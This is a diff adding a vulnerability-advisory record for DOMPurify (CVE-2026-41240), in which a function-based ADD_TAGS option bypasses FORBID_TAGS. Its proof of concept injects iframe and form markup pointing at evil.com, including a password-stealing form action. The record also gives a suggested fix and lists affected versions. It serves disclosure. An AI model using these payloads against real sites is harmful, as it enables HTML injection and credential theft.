@@ -1,0 +1,261 @@
+advisory_id: GHSA-h7mw-gpvr-xq4m
+datasource_id: github_osv/GHSA-h7mw-gpvr-xq4m
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-h7mw-gpvr-xq4m/GHSA-h7mw-gpvr-xq4m.json
+aliases:
+  - CVE-2026-41240
+summary: |
+  DOMPurify: FORBID_TAGS bypassed by function-based ADD_TAGS predicate (asymmetry with FORBID_ATTR fix)
+  There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.
+
+  Commit [c361baa](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80) added an early exit for FORBID_ATTR at line 1214:
+
+      /* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */
+      if (FORBID_ATTR[lcName]) {
+        return false;
+      }
+
+  The same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:
+
+      if (
+        !(
+          EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&
+          EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -> short-circuits
+        ) &&
+        (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated
+      ) {
+
+  This allows forbidden elements to survive sanitization with their attributes intact.
+
+  PoC (tested against current HEAD in Node.js + jsdom):
+
+      const DOMPurify = createDOMPurify(window);
+
+      DOMPurify.sanitize(
+        '<iframe src="https://evil.com"></iframe>',
+        {
+          ADD_TAGS: function(tag) { return true; },
+          FORBID_TAGS: ['iframe']
+        }
+      );
+      // Returns: '<iframe src="https://evil.com"></iframe>'
+      // Expected: '' (iframe forbidden)
+
+      DOMPurify.sanitize(
+        '<form action="https://evil.com/steal"><input name=password></form>',
+        {
+          ADD_TAGS: function(tag) { return true; },
+          FORBID_TAGS: ['form']
+        }
+      );
+      // Returns: '<form action="https://evil.com/steal"><input name="password"></form>'
+      // Expected: '<input name="password">' (form forbidden)
+
+  Confirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.
+
+  Compare with FORBID_ATTR which correctly wins:
+
+      DOMPurify.sanitize(
+        '<p onclick="alert(1)">hello</p>',
+        {
+          ADD_ATTR: function(attr) { return true; },
+          FORBID_ATTR: ['onclick']
+        }
+      );
+      // Returns: '<p>hello</p>' (onclick correctly removed)
+
+  Suggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:
+
+      /* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */
+      if (FORBID_TAGS[tagName]) {
+        // proceed to removal logic
+      }
+
+  This requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.
+
+  Reporter: Koda Reef
+impacted_packages:
+  - purl: pkg:npm/dompurify
+    affected_versions: vers:npm/<3.4.0
+    fixed_versions: vers:npm/3.4.0
+    affected_packages:
+      - pkg:npm/dompurify@0.4.0
+      - pkg:npm/dompurify@0.4.2
+      - pkg:npm/dompurify@0.4.3
+      - pkg:npm/dompurify@0.4.4
+      - pkg:npm/dompurify@0.4.5
+      - pkg:npm/dompurify@0.6.0
+      - pkg:npm/dompurify@0.6.1
+      - pkg:npm/dompurify@0.6.2
+      - pkg:npm/dompurify@0.6.3
+      - pkg:npm/dompurify@0.6.4
+      - pkg:npm/dompurify@0.6.5
+      - pkg:npm/dompurify@0.6.6
+      - pkg:npm/dompurify@0.6.7
+      - pkg:npm/dompurify@0.7.0
+      - pkg:npm/dompurify@0.7.1
+      - pkg:npm/dompurify@0.7.2
+      - pkg:npm/dompurify@0.7.3
+      - pkg:npm/dompurify@0.7.4
+      - pkg:npm/dompurify@0.8.0
+      - pkg:npm/dompurify@0.8.1
+      - pkg:npm/dompurify@0.8.2
+      - pkg:npm/dompurify@0.8.3
+      - pkg:npm/dompurify@0.8.4
+      - pkg:npm/dompurify@0.8.5
+      - pkg:npm/dompurify@0.8.6
+      - pkg:npm/dompurify@0.8.7
+      - pkg:npm/dompurify@0.8.8
+      - pkg:npm/dompurify@0.8.9
+      - pkg:npm/dompurify@0.9.0
+      - pkg:npm/dompurify@1.0.0
+      - pkg:npm/dompurify@1.0.1
+      - pkg:npm/dompurify@1.0.2
+      - pkg:npm/dompurify@1.0.3
+      - pkg:npm/dompurify@1.0.4
+      - pkg:npm/dompurify@1.0.5
+      - pkg:npm/dompurify@1.0.6
+      - pkg:npm/dompurify@1.0.7
+      - pkg:npm/dompurify@1.0.8
+      - pkg:npm/dompurify@1.0.9
+      - pkg:npm/dompurify@1.0.10
+      - pkg:npm/dompurify@1.0.11
+      - pkg:npm/dompurify@2.0.0
+      - pkg:npm/dompurify@2.0.1
+      - pkg:npm/dompurify@2.0.2
+      - pkg:npm/dompurify@2.0.3
+      - pkg:npm/dompurify@2.0.4
+      - pkg:npm/dompurify@2.0.5
+      - pkg:npm/dompurify@2.0.6
+      - pkg:npm/dompurify@2.0.7
+      - pkg:npm/dompurify@2.0.8
+      - pkg:npm/dompurify@2.0.9
+      - pkg:npm/dompurify@2.0.10
+      - pkg:npm/dompurify@2.0.11
+      - pkg:npm/dompurify@2.0.12
+      - pkg:npm/dompurify@2.0.13
+      - pkg:npm/dompurify@2.0.14
+      - pkg:npm/dompurify@2.0.15
+      - pkg:npm/dompurify@2.0.16
+      - pkg:npm/dompurify@2.0.17
+      - pkg:npm/dompurify@2.1.0
+      - pkg:npm/dompurify@2.1.1
+      - pkg:npm/dompurify@2.2.0
+      - pkg:npm/dompurify@2.2.1
+      - pkg:npm/dompurify@2.2.2
+      - pkg:npm/dompurify@2.2.3
+      - pkg:npm/dompurify@2.2.4
+      - pkg:npm/dompurify@2.2.5
+      - pkg:npm/dompurify@2.2.6
+      - pkg:npm/dompurify@2.2.7
+      - pkg:npm/dompurify@2.2.8
+      - pkg:npm/dompurify@2.2.9
+      - pkg:npm/dompurify@2.3.0
+      - pkg:npm/dompurify@2.3.1
+      - pkg:npm/dompurify@2.3.2
+      - pkg:npm/dompurify@2.3.3
+      - pkg:npm/dompurify@2.3.4
+      - pkg:npm/dompurify@2.3.5
+      - pkg:npm/dompurify@2.3.6
+      - pkg:npm/dompurify@2.3.7
+      - pkg:npm/dompurify@2.3.8
+      - pkg:npm/dompurify@2.3.9
+      - pkg:npm/dompurify@2.3.10
+      - pkg:npm/dompurify@2.3.11
+      - pkg:npm/dompurify@2.3.12
+      - pkg:npm/dompurify@2.4.0
+      - pkg:npm/dompurify@2.4.1
+      - pkg:npm/dompurify@2.4.2
+      - pkg:npm/dompurify@2.4.3
+      - pkg:npm/dompurify@2.4.4
+      - pkg:npm/dompurify@2.4.5
+      - pkg:npm/dompurify@2.4.6
+      - pkg:npm/dompurify@2.4.7
+      - pkg:npm/dompurify@2.4.8
+      - pkg:npm/dompurify@2.4.9
+      - pkg:npm/dompurify@2.5.0
+      - pkg:npm/dompurify@2.5.1
+      - pkg:npm/dompurify@2.5.2
+      - pkg:npm/dompurify@2.5.3
+      - pkg:npm/dompurify@2.5.4
+      - pkg:npm/dompurify@2.5.5
+      - pkg:npm/dompurify@2.5.6
+      - pkg:npm/dompurify@2.5.7
+      - pkg:npm/dompurify@2.5.8
+      - pkg:npm/dompurify@2.5.9
+      - pkg:npm/dompurify@3.0.0
+      - pkg:npm/dompurify@3.0.1
+      - pkg:npm/dompurify@3.0.2
+      - pkg:npm/dompurify@3.0.3
+      - pkg:npm/dompurify@3.0.4
+      - pkg:npm/dompurify@3.0.5
+      - pkg:npm/dompurify@3.0.6
+      - pkg:npm/dompurify@3.0.7
+      - pkg:npm/dompurify@3.0.8
+      - pkg:npm/dompurify@3.0.9
+      - pkg:npm/dompurify@3.0.10
+      - pkg:npm/dompurify@3.0.11
+      - pkg:npm/dompurify@3.1.0
+      - pkg:npm/dompurify@3.1.1
+      - pkg:npm/dompurify@3.1.2
+      - pkg:npm/dompurify@3.1.3
+      - pkg:npm/dompurify@3.1.4
+      - pkg:npm/dompurify@3.1.5
+      - pkg:npm/dompurify@3.1.6
+      - pkg:npm/dompurify@3.1.7
+      - pkg:npm/dompurify@3.2.0
+      - pkg:npm/dompurify@3.2.1
+      - pkg:npm/dompurify@3.2.2
+      - pkg:npm/dompurify@3.2.3
+      - pkg:npm/dompurify@3.2.4
+      - pkg:npm/dompurify@3.2.5
+      - pkg:npm/dompurify@3.2.6
+      - pkg:npm/dompurify@3.2.7
+      - pkg:npm/dompurify@3.3.0
+      - pkg:npm/dompurify@3.3.1
+      - pkg:npm/dompurify@3.3.2
+      - pkg:npm/dompurify@3.3.3
+    fixed_packages:
+      - pkg:npm/dompurify@3.4.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/cure53/dompurify
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/cure53/dompurify
+        commit: c361baa18dbdcb3344a41110f4c48ad85bf48f80
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.0'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-h7mw-gpvr-xq4m/GHSA-h7mw-gpvr-xq4m.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-183
+  - CWE-79
+references:
+  - url: https://github.com/cure53/DOMPurify
+    reference_type:
+    reference_id:
+  - url: https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80
+    reference_type:
+    reference_id:
+  - url: https://github.com/cure53/DOMPurify/releases/tag/3.4.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-41240
+    reference_type:
+    reference_id: CVE-2026-41240
+  - url: https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m
+    reference_type:
+    reference_id: GHSA-h7mw-gpvr-xq4m
+exploits: []
